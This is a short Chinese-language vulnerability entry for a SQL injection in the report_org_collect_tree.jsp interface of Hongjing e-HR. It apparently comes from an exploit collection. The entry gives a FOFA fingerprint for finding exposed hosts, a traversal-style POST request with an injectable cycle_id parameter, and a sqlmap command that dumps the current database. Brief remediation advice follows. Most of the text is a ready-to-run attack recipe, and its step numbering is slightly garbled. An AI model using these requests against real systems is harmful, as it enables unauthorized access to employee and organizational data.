# 宏景e-HR的report_org_collect_tree接口sql注入

- **系统**：宏景e-HR的report_org_collect_tree接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="HJSOFT-HCM"
1. 部分界面如下
3、隐患url,复现如下
Host: xxx
Content-Type: application/x-www-form-urlencoded
params=&isAction=2&cycle_id=2*
4、sqlma语句
python sqlmap.py -r sqlmap.txt —dbms mssql —current-db —batch —force-ssl
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。